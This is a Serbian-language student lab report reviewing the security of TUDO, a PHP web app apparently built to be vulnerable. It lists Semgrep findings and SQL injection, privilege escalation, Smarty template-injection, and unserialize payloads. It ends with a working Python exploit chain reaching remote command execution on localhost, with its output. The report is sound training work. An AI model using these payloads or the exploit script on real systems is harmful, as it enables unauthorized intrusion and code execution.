# Vežba 5 — Security Code Review and Analysis

**Tim 30**

---

## 1. Statička analiza

### Alat: Semgrep

```bash
pip install semgrep
cd tudo/app
$env:PYTHONUTF8=1
semgrep scan --config=auto .
```

### Rezultati — 2 nalaza

| # | Fajl | Linija | Ranjivost |
|---|------|--------|-----------|
| 1 | `forgotusername.php` | 12 | SQL Injection — korisnički unos direktno ugrađen u SQL upit |
| 2 | `admin/import_user.php` | 7 | `unserialize()` sa korisničkim unosom — mogući RCE |

---

## 2. Pronađene ranjivosti

### 2.1 SQL Injection — `forgotusername.php:12`

**Ranjiv kod:**
```php
$ret = pg_query($db, "select * from users where username='".$username."';");
```

Korisnički unos se direktno lepi u SQL upit bez prepared statement-a. Napadač može ubaciti SQL kod i zaobići logiku aplikacije.

**Payload:**
```
' OR '1'='1' --
```

---

### 2.2 Privilege Escalation — `login.php:17`

**Ranjiv kod:**
```php
$_SESSION['username'] = $_POST['username'];
if ($_SESSION['username'] === 'admin')
    $_SESSION['isadmin'] = true;
```

`isadmin` se postavlja na osnovu korisničkog unosa iz POST zahteva, a ne iz baze podataka. Dovoljno je da se neko uloguje sa username-om `admin` da dobije admin privilegije.

---

### 2.3 Remote Code Execution — Smarty Server-Side Template Injection

**Ranjiv kod u `admin/update_motd.php`:**
```php
$t_file = fopen("../templates/motd.tpl","w");
fwrite($t_file, $message);
```

**Ranjiv kod u `index.php`:**
```php
$smarty->assign("username", $_SESSION['username']);
$smarty->fetch("motd.tpl");
```

Admin može da prepiše `motd.tpl` sa Smarty payload-om. Smarty izvršava `{php}` blokove kao PHP kod pri renderovanju.

**Payload:**
```
{php}echo shell_exec('id');{/php}
```

---

### 2.4 PHP Object Injection — `admin/import_user.php:7`

**Ranjiv kod:**
```php
$user = unserialize($userObj);
```

**Gadget klasa u `includes/utils.php`:**
```php
class Log {
    public function __destruct() {
        file_put_contents($this->f, $this->m, FILE_APPEND);
    }
}
```

`unserialize()` prima korisnički unos bez validacije. Klasa `Log` ima `__destruct()` metodu koja piše u fajl — može se iskoristiti za pisanje PHP shella. Semgrep je identifikovao ovu ranjivost.

---

### 2.5 Weak Token Generator — `includes/utils.php`

**Ranjiv kod:**
```php
srand(round(microtime(true) * 1000));
```

Reset token se generiše sa seedom koji je Unix timestamp u milisekundama — vrednost koja je predvidiva i može se pogoditi napadom.

---

## 3. Exploit chain

```
SQL Injection (Auth Bypass) → Admin Login (Privilege Escalation) → Smarty SSTI (RCE)
```

---

## 4. Exploit skript

```python
import requests

TARGET = "http://localhost:8000"
s = requests.Session()

# KORAK 1: SQL Injection (Authentication Bypass)
s.post(f"{TARGET}/forgotusername.php", data={"username": "' OR '1'='1' --"})
print("[1] SQL Injection -> forgotusername.php:12")

# KORAK 2: Login kao admin (Privilege Escalation)
s.post(f"{TARGET}/login.php", data={"username": "admin", "password": "admin"})
print("[2] Admin login -> login.php:17 (isadmin iz POST parametra)")

# KORAK 3: RCE - Smarty Template Injection
def rce(cmd):
    s.post(f"{TARGET}/admin/update_motd.php", data={"message": "{php}echo shell_exec('" + cmd + "');{/php}"})
    r = s.get(f"{TARGET}/index.php")
    start = r.text.find("center_div\">") + 12
    end = r.text.find("<br>", start)
    return r.text[start:end].strip().replace("</a>", "").strip()

print("[3] Smarty SSTI -> update_motd.php\n")

for cmd in ["id", "whoami", "hostname"]:
    print(f"$ {cmd}\n{rce(cmd)}\n")

# Vrati original
s.post(f"{TARGET}/admin/update_motd.php", data={
    "message": "Hello, {$username}! Welcome to TUDO -admin :)"
})
```

### Output:

```
[1] SQL Injection -> forgotusername.php:12
[2] Admin login -> login.php:17 (isadmin iz POST parametra)
[3] Smarty SSTI -> update_motd.php

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

$ whoami
www-data

$ hostname
c4d4da2065c9
```

---

## 5. Rezime ranjivosti

| # | Ranjivost | Fajl | Linija | STRIDE kategorija |
|---|-----------|------|--------|-------------------|
| 1 | SQL Injection | `forgotusername.php` | 12 | Tampering |
| 2 | Privilege Escalation | `login.php` | 17 | Elevation of Privilege |
| 3 | Smarty SSTI (RCE) | `update_motd.php` | — | Elevation of Privilege |
| 4 | PHP Object Injection | `admin/import_user.php` | 7 | Elevation of Privilege |
| 5 | Weak Token Generator | `includes/utils.php` | 3 | Tampering |
